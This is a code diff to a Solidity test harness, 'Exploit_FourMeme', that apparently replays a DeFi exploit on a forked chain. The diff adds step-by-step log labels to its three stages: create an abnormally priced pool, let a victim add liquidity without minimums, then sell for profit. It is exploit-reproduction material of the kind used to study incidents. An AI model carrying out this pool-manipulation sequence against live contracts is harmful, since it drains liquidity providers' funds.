@@ -40,6 +40,9 @@ contract Exploit_FourMeme is TestHarness, TokenBalanceTracker {
     }
 
     function createAbnormalPricePool() internal {
+        
+        console.log('-- Attacker initializes malicious pool --');
+        console.log('');
         address poolAddress = pancakePositionManager.createAndInitializePoolIfNecessary(
             address(snowboard), 
             address(WBNB), 
@@ -74,6 +77,8 @@ contract Exploit_FourMeme is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel('snowWBNBPool before liquidity provision', snowWBNBPoolAddress);
         // Deploy liquidity
 
+        console.log('-- Victim deploys liquidity into malicious pool --');
+        console.log('');
         victim.deployLiquidity(
             pancakePositionManager,
             snowboard,
@@ -98,6 +103,8 @@ contract Exploit_FourMeme is TestHarness, TokenBalanceTracker {
         updateBalanceTracker(address(attackerContract));
         logBalancesWithLabel('attackerContract before swap', address(attackerContract));
 
+        console.log('-- attackerContract swaps tokens --');
+        console.log('');
         attackerContract.swapTokens(pancakeFactory, address(snowboard), address(WBNB));
 
         logBalancesWithLabel('attackerContract after swap', address(attackerContract));
@@ -107,17 +114,17 @@ contract Exploit_FourMeme is TestHarness, TokenBalanceTracker {
     }
 
     function test_attack() external {
-        console.log('------- createAbnormalPricePool -------');
+        console.log('------- Step 1: Create abnormal price pool -------');
         console.log('');
         createAbnormalPricePool();
 
-        console.log('------- deployLiquidityUnchecked -------');
+        console.log('------- Step 2: Deploy liquidity without establishing expected minimums -------');
         console.log('');
 
         cheat.rollFork(46_555_730); // Liquidity deployment block - 1
         deployLiquidityUnchecked();
         
-        console.log('------- sellTokensAndProfit -------');
+        console.log('------- Step 3: Sell tokens and profit -------');
         console.log('');
         cheat.rollFork(46_555_731); // Tokens sale block - 1
         sellTokensAndProfit();
